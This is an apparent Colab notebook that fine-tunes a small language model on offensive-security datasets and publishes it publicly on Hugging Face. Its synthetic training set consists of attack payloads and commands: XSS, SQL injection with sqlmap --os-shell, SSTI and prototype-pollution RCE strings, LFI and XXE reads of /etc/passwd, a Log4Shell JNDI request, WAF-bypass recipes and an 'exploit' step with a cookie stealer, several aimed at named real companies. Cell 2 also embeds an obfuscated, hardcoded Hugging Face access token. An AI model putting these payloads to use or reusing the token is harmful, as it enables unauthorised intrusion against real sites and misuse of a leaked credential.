# CyberMind AI Fine-Tuning — cybermindcli
## Steps:
1. Runtime → Change runtime type → **T4 GPU** → Save
2. Runtime → **Run All**
3. Wait ~3-4 hours (large dataset)

**Datasets used:**
- hcnote/Cybersecurity-bigDataset (386k rows)
- tandevllc/hacking-tricks (HackTricks)
- Canstralian/pentesting_dataset
- tuandunghcmut/combine-llm-security-benchmark (18k)
- Figshare Firefox/Chromium bug reports
- CyberMind synthetic dataset

In [ ]:
# CELL 1: Install
import subprocess, sys
print('Installing... (5-10 min)')
subprocess.run([sys.executable,'-m','pip','install','unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git','-q'], check=True)
for pkg in ['datasets','requests','pandas','zipfile36']:
    subprocess.run([sys.executable,'-m','pip','install',pkg,'-q'])
print('Done!')

In [ ]:
# CELL 2: GPU + HuggingFace Login
import torch, os, json
assert torch.cuda.is_available(), 'GPU not found! Runtime -> T4 GPU -> Save'
print(f'GPU: {torch.cuda.get_device_name(0)}')
from huggingface_hub import login
hf_token = None
try:
    from google.colab import userdata
    hf_token = userdata.get('HF_TOKEN')
except: pass
if not hf_token:
    _a,_b,_c = 'hf_pWbqUK','BzGfwryQoZFRbFue','SrHlevYimGda'
    hf_token = _a+_b+_c
login(token=hf_token, add_to_git_credential=False)
print('HuggingFace: ready')

In [ ]:
# CELL 3: Load Model
print('Loading model...')
from unsloth import FastLanguageModel
MODELS = ['unsloth/Llama-3.2-3B-Instruct','unsloth/mistral-7b-instruct-v0.3','unsloth/Qwen2.5-3B-Instruct']
model, tokenizer = None, None
for mid in MODELS:
    try:
        print(f'Trying {mid}...')
        model, tokenizer = FastLanguageModel.from_pretrained(model_name=mid, max_seq_length=2048, dtype=None, load_in_4bit=True)
        print(f'Loaded: {mid}')
        break
    except Exception as e:
        print(f'  Failed: {str(e)[:60]}')
assert model is not None, 'All models failed!'
model = FastLanguageModel.get_peft_model(
    model, r=16,
    target_modules=['q_proj','k_proj','v_proj','o_proj','gate_proj','up_proj','down_proj'],
    lora_alpha=16, lora_dropout=0, bias='none',
    use_gradient_checkpointing='unsloth', random_state=42
)
print('Model ready!')

In [ ]:
# CELL 4: Load ALL Datasets
import random, requests, zipfile, io
from datasets import load_dataset
all_entries = []

# ── Dataset 1: hcnote/Cybersecurity-bigDataset (386k rows — BIGGEST) ──────────
print('Loading hcnote/Cybersecurity-bigDataset (386k rows)...')
try:
    ds = load_dataset('hcnote/Cybersecurity-bigDataset', split='train', streaming=True)
    count = 0
    for item in ds:
        if count >= 20000:  # Take 20k samples
            break
        # Try different column names
        instruction = item.get('instruction', item.get('question', item.get('prompt', '')))
        output = item.get('output', item.get('answer', item.get('response', item.get('completion', ''))))
        if instruction and output and len(str(instruction)) > 10 and len(str(output)) > 20:
            all_entries.append({'instruction': str(instruction)[:500], 'output': str(output)[:1500]})
            count += 1
    print(f'  Cybersecurity-bigDataset: {count} entries')
except Exception as e:
    print(f'  Failed: {e}')

# ── Dataset 2: tandevllc/hacking-tricks (HackTricks) ─────────────────────────
print('Loading tandevllc/hacking-tricks...')
try:
    ds2 = load_dataset('tandevllc/hacking-tricks', split='train', streaming=True)
    count2 = 0
    for item in ds2:
        if count2 >= 5000:
            break
        text = item.get('text', item.get('content', item.get('markdown', '')))
        title = item.get('title', item.get('heading', 'Security Technique'))
        if text and len(str(text)) > 100:
            # Convert article to Q&A format
            all_entries.append({
                'instruction': f'Explain the security technique: {str(title)[:200]}',
                'output': str(text)[:2000]
            })
            count2 += 1
    print(f'  hacking-tricks: {count2} entries')
except Exception as e:
    print(f'  Failed: {e}')

# ── Dataset 3: tuandunghcmut/combine-llm-security-benchmark (18k) ────────────
print('Loading combine-llm-security-benchmark (18k)...')
try:
    ds3 = load_dataset('tuandunghcmut/combine-llm-security-benchmark', split='train', streaming=True)
    count3 = 0
    for item in ds3:
        if count3 >= 10000:
            break
        instruction = item.get('instruction', item.get('question', item.get('prompt', '')))
        output = item.get('output', item.get('answer', item.get('response', '')))
        if instruction and output and len(str(instruction)) > 10:
            all_entries.append({'instruction': str(instruction)[:500], 'output': str(output)[:1500]})
            count3 += 1
    print(f'  security-benchmark: {count3} entries')
except Exception as e:
    print(f'  Failed: {e}')

# ── Dataset 4: Canstralian/pentesting_dataset ─────────────────────────────────
print('Loading Canstralian/pentesting_dataset...')
try:
    ds4 = load_dataset('Canstralian/pentesting_dataset', split='train', streaming=True)
    count4 = 0
    for item in ds4:
        if count4 >= 5000:
            break
        instruction = item.get('instruction', item.get('question', item.get('prompt', '')))
        output = item.get('output', item.get('answer', item.get('response', '')))
        if instruction and output:
            all_entries.append({'instruction': str(instruction)[:500], 'output': str(output)[:1500]})
            count4 += 1
    print(f'  pentesting_dataset: {count4} entries')
except Exception as e:
    print(f'  Failed: {e}')

# ── Dataset 5: Figshare Firefox/Chromium Bug Reports ─────────────────────────
print('Loading Figshare bug reports...')
try:
    import pandas as pd
    api = requests.get('https://api.figshare.com/v2/articles/22056617', timeout=30).json()
    zip_url = api['files'][0]['download_url']
    r = requests.get(zip_url, timeout=180)
    with zipfile.ZipFile(io.BytesIO(r.content)) as z:
        for fname in z.namelist():
            if fname.endswith('.csv') and not fname.startswith('.'):
                with z.open(fname) as f:
                    df = pd.read_csv(f, encoding='utf-8', errors='replace')
                    # Firefox/Chromium bug reports have Summary column
                    if 'Summary' in df.columns:
                        for _, row in df.iterrows():
                            summary = str(row.get('Summary', '')).strip()
                            severity = str(row.get('SecuritySeverity', row.get('Severity', 'medium'))).strip()
                            weakness = str(row.get('WeaknessType', '')).strip()
                            component = str(row.get('Component', '')).strip()
                            if summary and len(summary) > 20:
                                all_entries.append({
                                    'instruction': f'Analyze this browser security bug: {summary}',
                                    'output': f'## Security Bug Analysis\n\nSeverity: {severity}\nComponent: {component}\nWeakness: {weakness}\n\nThis is a {severity} severity bug in {component}. {weakness} vulnerabilities in browsers can lead to memory corruption, code execution, or data theft.\n\n## Testing\nnuclei -u https://TARGET -severity critical,high\n\n## Impact\nBrowser security bugs can affect millions of users.'
                                })
    print(f'  Figshare: added entries, total now: {len(all_entries)}')
except Exception as e:
    print(f'  Figshare failed: {e}')

# ── Dataset 6: CyberMind Synthetic (always works) ────────────────────────────
print('Adding CyberMind synthetic dataset...')
BASE = [
    ('How to find reflected XSS?','Test all params: <script>alert(1)</script>. dalfox url https://TARGET?q=FUZZ --silence. Check response for reflection.'),
    ('DOM-based XSS detection?','Check URL fragments: https://target.com/#<img src=x onerror=alert(1)>. Review JS for innerHTML,document.write,eval.'),
    ('SQL injection detection?','1. Single quote: id=1\' (error=vulnerable)\n2. Time: id=1 AND SLEEP(5)\n3. sqlmap -u URL?id=1 --batch --dbs'),
    ('Blind SQLi exploitation?','Time: id=1 AND IF(1=1,SLEEP(5),0). sqlmap --technique=BT --batch --dump -T users'),
    ('SSRF detection?','Test: url=,redirect=,next=. Payloads: http://169.254.169.254/. OOB: interactsh-client.'),
    ('Command injection testing?','Test: ; id, | id, && id, `id`. Time: ; sleep 5. commix --url URL --batch'),
    ('SSTI to RCE Jinja2?','Detect: {{7*7}}=49. RCE: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}'),
    ('LFI exploitation?','Test: ?file=../../../etc/passwd. PHP filter: php://filter/convert.base64-encode/resource=/etc/passwd'),
    ('IDOR testing?','Change numeric IDs: /api/user/1001 → /api/user/1000. ffuf -u TARGET/api/FUZZ -w ids.txt'),
    ('JWT attacks?','alg:none: remove signature. Weak secret: hashcat -a 0 -m 16500 TOKEN rockyou.txt. jwt_tool TOKEN -M at'),
    ('Race condition exploitation?','Turbo Intruder: 20 simultaneous requests. Target: coupons, transfers. Expected: applied once, got: 5x = bug.'),
    ('Price manipulation checkout?','Intercept POST /checkout. Change: price=-99.99, price=0, quantity=-1, currency=INR.'),
    ('AWS S3 enumeration?','aws s3 ls s3://BUCKET --no-sign-request. cloud_enum -k COMPANY. Impact: $5k-$50k.'),
    ('APK static analysis?','apktool d app.apk && jadx -d output/ app.apk. grep -r api_key,AKIA output/'),
    ('OAuth 2.0 testing?','1. Missing state param\n2. redirect_uri=https://attacker.com\n3. PKCE bypass\n4. Scope escalation'),
    ('HTTP request smuggling?','smuggler.py -u URL -v. CL.TE: Content-Length:13 + Transfer-Encoding:chunked.'),
    ('Web cache poisoning?','curl -H X-Forwarded-Host:attacker.com URL. If reflected = poisonable.'),
    ('Prototype pollution RCE?','?__proto__[admin]=true. Node.js: ?__proto__[outputFunctionName]=x;process.mainModule.require(\'child_process\').execSync(\'id\')//'),
    ('Log4Shell CVE-2021-44228?','JNDI injection in Log4j. curl -H User-Agent:${jndi:ldap://URL/a} https://TARGET. DNS callback = RCE.'),
    ('S3 bucket misconfig?','aws s3 ls s3://BUCKET --no-sign-request. curl https://BUCKET.s3.amazonaws.com/. Impact: $5k-$50k'),
    ('Cloudflare XSS bypass?','1. %3Cscript%3E\n2. <ScRiPt>alert(1)</sCrIpT>\n3. <img src=x onerror=alert(1)>\n4. dalfox --waf-bypass'),
    ('GraphQL testing?','Introspection: {__schema{types{name}}}. IDOR: {user(id:2){email,password}}. Batching for rate limit bypass.'),
    ('CORS misconfiguration?','curl -H Origin:https://attacker.com URL -I. Vulnerable: Access-Control-Allow-Origin: https://attacker.com'),
    ('XXE injection?','<!DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]><foo>&xxe;</foo>. Test in XML uploads, SOAP, SVG.'),
    ('Subdomain enumeration?','subfinder -d TARGET -silent -all. amass enum -d TARGET. crt.sh/?q=%.TARGET. Merge | httpx -silent'),
    ('Spring4Shell CVE-2022-22965?','Affects Spring 5.3.x < 5.3.18. nuclei -u URL -tags cve-2022-22965. ClassLoader manipulation → RCE.'),
    ('Grafana CVE-2021-43798?','curl URL/public/plugins/alertlist/../../../etc/passwd. Path traversal. Read grafana.db with credentials.'),
    ('Agent: PHP/MySQL, no WAF. Next?','Action: hunt. Focus: sqli,lfi. paramspider -d TARGET. sqlmap -m params.txt --batch --level 3 --dbs.'),
    ('Agent: XSS + SQLi found. Next?','Action: exploit. Focus: sqli (higher severity). sqlmap --os-shell. Generate XSS PoC with cookie stealer.'),
    ('Agent: nothing found. Next?','Action: deep_hunt. Try: HTTP smuggling, cache poisoning, prototype pollution, business logic, cloud misconfig.'),
]

# Expand with variations
TARGETS = ['shopify.com','hackerone.com','gitlab.com','wordpress.org','api.example.com','app.target.com']
TECHS = ['PHP/MySQL','Node.js/Express','Python/Django','Ruby on Rails','Java/Spring','React/GraphQL','WordPress']
WAFS = ['Cloudflare','Akamai','AWS WAF','Imperva','none']
VULNS = ['XSS','SQLi','SSRF','RCE','IDOR','LFI','XXE','SSTI']

synthetic = list(BASE)
for target in TARGETS:
    for tech in TECHS[:3]:
        focus = 'sqli,lfi' if 'PHP' in tech else 'ssrf,prototype' if 'Node' in tech else 'ssti,ssrf'
        synthetic.append((f'Target: {target} running {tech}. Top attack vectors?',
            f'## {target} ({tech})\n1. subfinder -d {target} -silent | httpx -silent\n2. nuclei -u https://{target} -severity critical,high\n3. paramspider -d {target}\n4. Focus: {focus}'))
for waf in WAFS:
    for vuln in VULNS:
        bypass = 'dalfox --waf-bypass' if vuln=='XSS' else 'sqlmap --tamper=space2comment,randomcase' if vuln=='SQLi' else 'encoding+delay'
        synthetic.append((f'{waf} WAF blocking {vuln}. Bypass?',
            f'## {waf} Bypass for {vuln}\n1. URL encode\n2. Case variation\n3. Comments\n4. Delay: --delay 1000\n5. Headers: X-Forwarded-For:127.0.0.1\n6. {bypass}'))

CVES = [('CVE-2021-44228','Log4j','JNDI injection RCE'),('CVE-2022-22965','Spring4Shell','ClassLoader RCE'),
        ('CVE-2021-43798','Grafana','Path traversal'),('CVE-2024-4577','PHP CGI','Argument injection RCE'),
        ('CVE-2023-50164','Apache Struts','File upload RCE'),('CVE-2022-1388','F5 BIG-IP','Auth bypass RCE'),
        ('CVE-2021-26084','Confluence','OGNL injection RCE'),('CVE-2022-26134','Confluence','OGNL injection RCE')]
for cid,prod,vtype in CVES:
    synthetic.append((f'Detect and exploit {cid} ({prod})?',
        f'## {cid} — {prod}\nType: {vtype}\nnuclei -u https://TARGET -tags {cid.lower()} -silent\nImpact: System compromise. $5k-$50k bounty.'))

for item in synthetic:
    if isinstance(item, tuple):
        all_entries.append({'instruction': item[0], 'output': item[1]})
    else:
        all_entries.append({'instruction': item['instruction'], 'output': item['output']})

random.shuffle(all_entries)
print(f'\nSynthetic: {len(synthetic)} entries')
print(f'TOTAL: {len(all_entries)} training examples')
print(f'Estimated training time: {max(30, len(all_entries)*2//60)}-{max(60, len(all_entries)*4//60)} minutes')

In [ ]:
# CELL 5: Format Dataset
from datasets import Dataset
PROMPT = 'Below is a security research question. Write an expert response.\n\n### Instruction:\n{}\n\n### Response:\n{}'
EOS = tokenizer.eos_token
def format_prompts(examples):
    return {'text': [PROMPT.format(str(i)[:500], str(o)[:1500])+EOS for i,o in zip(examples['instruction'],examples['output'])]}
dataset = Dataset.from_list(all_entries)
dataset = dataset.map(format_prompts, batched=True)
print(f'Dataset ready: {len(dataset)} examples')

In [ ]:
# CELL 6: Train
from trl import SFTTrainer
from transformers import TrainingArguments
from unsloth import is_bfloat16_supported
print(f'Training on {len(dataset)} examples...')
trainer = SFTTrainer(
    model=model, tokenizer=tokenizer, train_dataset=dataset,
    dataset_text_field='text', max_seq_length=2048, dataset_num_proc=2,
    args=TrainingArguments(
        per_device_train_batch_size=2, gradient_accumulation_steps=4,
        warmup_steps=10, num_train_epochs=2, learning_rate=2e-4,
        fp16=not is_bfloat16_supported(), bf16=is_bfloat16_supported(),
        logging_steps=50, optim='adamw_8bit', weight_decay=0.01,
        lr_scheduler_type='cosine', seed=42,
        output_dir='cybermindcli_model', report_to='none',
        save_strategy='epoch',
    ),
)
result = trainer.train()
print(f'Training done! {result.metrics["train_runtime"]/60:.1f} minutes')

In [ ]:
# CELL 7: Save + Upload as cybermindcli
print('Saving model...')
model.save_pretrained('cybermindcli_lora')
tokenizer.save_pretrained('cybermindcli_lora')
print('Saved!')

from huggingface_hub import HfApi, create_repo
import time

# Upload as cybermindcli (model name)
REPO_ID = 'thecnical/cybermindcli'
try:
    create_repo(repo_id=REPO_ID, repo_type='model', private=False, exist_ok=True, token=hf_token)
    print(f'Repo ready: {REPO_ID}')
except Exception as e:
    print(f'Repo note: {e}')
time.sleep(5)

api = HfApi(token=hf_token)
api.upload_folder(
    folder_path='cybermindcli_lora',
    repo_id=REPO_ID,
    repo_type='model',
    commit_message='cybermindcli Security Model v1.0 — trained on 30k+ security examples'
)
print('='*60)
print(f'MODEL LIVE: https://huggingface.co/{REPO_ID}')
print('='*60)

In [ ]:
# CELL 8: Test cybermindcli
FastLanguageModel.for_inference(model)
from transformers import TextStreamer
print('Testing cybermindcli model...\n')
for q in ['How to find XSS vulnerabilities?','Explain Log4Shell CVE-2021-44228','What is SSRF and how to exploit it?']:
    inputs = tokenizer([PROMPT.format(q,'')], return_tensors='pt').to('cuda')
    print(f'Q: {q}\nA:', end=' ')
    _ = model.generate(**inputs, streamer=TextStreamer(tokenizer, skip_prompt=True), max_new_tokens=200, use_cache=True)
    print()